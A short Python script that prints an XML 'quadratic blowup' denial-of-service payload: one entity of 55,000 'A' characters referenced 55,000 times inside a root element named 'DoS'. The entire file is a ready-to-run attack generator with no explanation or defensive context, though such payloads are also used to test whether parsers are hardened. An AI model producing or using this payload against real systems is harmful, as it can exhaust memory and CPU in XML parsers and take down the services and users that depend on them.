#!/usr/bin/python3

NUM = 55000

def main():
	entity = 'A' * NUM
	refs = '&x;' * NUM
	templ = '''<?xml version="1.0"?>
	<!DOCTYPE DoS [
	  <!ENTITY x "{entity}">
	]>
	<DoS>{entityReferences}</DoS>
	'''.format(entity=entity, entityReferences=refs)

	print(templ)

if __name__ == '__main__':
	main()
